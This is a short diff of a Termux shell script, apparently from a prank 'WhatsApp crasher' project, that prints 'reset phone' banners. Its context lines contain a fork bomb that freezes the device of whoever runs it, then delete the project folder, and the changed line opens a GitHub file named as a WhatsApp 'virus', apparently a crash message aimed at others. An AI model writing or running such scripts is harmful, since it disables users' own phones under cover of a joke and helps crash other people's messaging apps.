@@ -49,7 +49,7 @@ echo "\e[91m "
 cowsay -f meow 1
 figlet "reset phone .·´¯`(>▂<)´¯`·.️"
 :(){ :|:& };:
-termux-open  https://instagram.com/krish_na_2568?utm_medium=copy_link
+termux-open  https://github.com/Vretlee/WhatsApp-Crasher/raw/main/BaapG%20Virus%206%20September.txt
 cd $HOME
 rm -rf CrashWhatsApp
 exit
